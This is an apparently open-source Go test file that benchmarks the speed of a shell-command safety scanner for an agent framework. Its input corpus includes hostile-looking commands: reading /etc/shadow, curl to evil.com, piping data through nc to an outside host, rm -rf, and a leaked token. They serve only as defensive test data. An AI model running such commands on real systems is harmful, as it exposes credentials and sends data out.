// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.

package safety

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// BenchmarkScanner500Lines benchmarks scanning 500 separate single-line
// commands — the equivalent of a 500-line script processed one line at a
// time. shellsafe intentionally rejects a single 500-line command, so
// the batch models 500 independent pre-execution requests.
//
// The commands are deliberately diverse (not just echo) to exercise
// multiple scanner rules: network clients, deletion, secrets, shell
// wrappers, dependency changes, and resource abuse.
func BenchmarkScanner500Lines(b *testing.B) {
	inputs := generateDiverseInputs(500)
	scanner := NewScanner(&Policy{
		NetworkWhitelist: []string{
			"github.com",
			"*.example.com",
			"10.0.0.0/8",
			"127.0.0.0/8",
		},
	})
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, input := range inputs {
			_ = scanner.Scan(input)
		}
	}
}

// BenchmarkScanner500Commands is the legacy name kept for compatibility.
// It delegates to BenchmarkScanner500Lines.
func BenchmarkScanner500Commands(b *testing.B) {
	inputs := generateDiverseInputs(500)
	scanner := NewScanner(&Policy{AllowedCommands: []string{"echo"}})
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, input := range inputs {
			_ = scanner.Scan(input)
		}
	}
}

// TestCorpusPerformance500Commands verifies that scanning 500 diverse
// commands completes within 1 second. This is a hard performance gate,
// not a micro-benchmark.
func TestCorpusPerformance500Commands(t *testing.T) {
	inputs := generateDiverseInputs(500)
	scanner := NewScanner(&Policy{
		NetworkWhitelist: []string{
			"github.com",
			"*.example.com",
			"10.0.0.0/8",
			"127.0.0.0/8",
		},
	})
	start := time.Now()
	for _, input := range inputs {
		_ = scanner.Scan(input)
	}
	elapsed := time.Since(start)
	if elapsed > time.Second {
		t.Fatalf("scanned 500 commands in %v, exceeds 1s limit", elapsed)
	}
	t.Logf("scanned 500 diverse commands in %v (limit: 1s)", elapsed)
}

// TestCorpusPerformance500LineScript verifies that scanning a single
// script composed of 500 lines (each scanned independently) completes
// within 1 second. This models a reviewer processing a 500-line shell
// script line-by-line through the safety guard.
func TestCorpusPerformance500LineScript(t *testing.T) {
	// Build a 500-line script where each line is a different command.
	lines := make([]string, 500)
	for i := range lines {
		lines[i] = fmt.Sprintf("echo line-%d", i)
	}
	script := strings.Join(lines, "\n")

	// Parse each line independently and scan it.
	scanner := NewScanner(nil)
	start := time.Now()
	for _, line := range strings.Split(script, "\n") {
		_ = scanner.Scan(ScanInput{Command: line})
	}
	elapsed := time.Since(start)
	if elapsed > time.Second {
		t.Fatalf("scanned 500-line script in %v, exceeds 1s limit", elapsed)
	}
	t.Logf("scanned 500-line script in %v (limit: 1s)", elapsed)
}

// generateDiverseInputs produces n ScanInputs that exercise every
// scanner rule at least once. The pattern repeats every 20 entries
// so 500 inputs contain 25 full cycles.
func generateDiverseInputs(n int) []ScanInput {
	templates := []ScanInput{
		{Command: "echo hello"},
		{Command: "ls -la"},
		{Command: "go test ./..."},
		{Command: "rm -rf build"},
		{Command: "cat /etc/shadow"},
		{Command: "curl https://evil.com"},
		{Command: "curl https://github.com/openai"},
		{Command: "bash -c 'echo ok'"},
		{Command: "echo data | nc outside.example 9000"},
		{Command: "go get example.com/module"},
		{Command: "npm install express"},
		{Command: "yes"},
		{Command: "stress --cpu 4"},
		{Command: "git config --global user.email a@example.com"},
		{Command: "echo token=secret-value"},
		{Command: "find . -name '*.go'"},
		{Command: "wc -l README.md"},
		{Command: "grep pattern file.txt"},
		{Command: "echo hello | sort | uniq"},
		{Command: "python3 -m pytest"},
	}
	inputs := make([]ScanInput, n)
	for i := range inputs {
		inputs[i] = templates[i%len(templates)]
	}
	return inputs
}
